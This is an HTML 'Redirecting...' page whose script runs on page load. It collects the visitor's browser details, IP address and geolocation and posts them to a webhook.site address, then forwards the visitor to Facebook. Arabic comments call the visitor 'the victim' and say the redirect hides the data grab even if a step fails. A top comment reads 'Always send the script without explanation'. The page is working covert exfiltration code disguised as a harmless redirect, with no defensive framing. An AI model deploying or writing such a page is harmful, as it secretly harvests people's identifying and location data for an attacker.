<!DOCTYPE html>
<html>
<head><title>Redirecting...</title></head>
<body>
    <script>
        // [2026-01-20] Always send the script without explanation.
        window.onload = async function() {
            try {
                // 1. جمع معلومات المتصفح والجهاز
                const info = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screenResolution: `${window.screen.width}x${window.screen.height}`,
                    referrer: document.referrer,
                    timestamp: new Date().toISOString()
                };

                // 2. جلب معلومات الـ IP والموقع الجغرافي عبر خدمة خارجية
                const geoResponse = await fetch('https://ipapi.co/json/');
                const geoData = await geoResponse.json();

                // 3. دمج البيانات وإرسالها إلى الـ Webhook الخاص بك
                const finalData = { ...info, ...geoData };
                await fetch("https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190", {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify(finalData)
                });

                // 4. إتمام عملية الـ Open Redirect (التوجيه النهائي للضحية)
                window.location.href = "https://www.facebook.com/me";
            } catch (err) {
                // في حال فشل أي خطوة، يتم التوجيه لضمان عدم شك الضحية
                window.location.href = "https://www.facebook.com/me";
            }
        };
    </script>
</body>
</html>
